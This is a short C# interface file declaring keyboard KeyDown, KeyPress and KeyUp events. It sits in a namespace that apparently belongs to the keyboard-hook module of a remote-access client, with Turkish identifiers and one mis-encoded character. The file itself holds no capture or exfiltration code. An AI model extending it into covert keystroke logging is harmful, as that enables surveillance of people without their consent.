using System.Windows.Forms;

namespace xClient.Kuuhaku«ekirdek.MouseKeyHook
{
    public interface KlavyeEylemleri
    {
        event KeyEventHandler KeyDown;
        event KeyPressEventHandler KeyPress;
        event KeyEventHandler KeyUp;
    }
}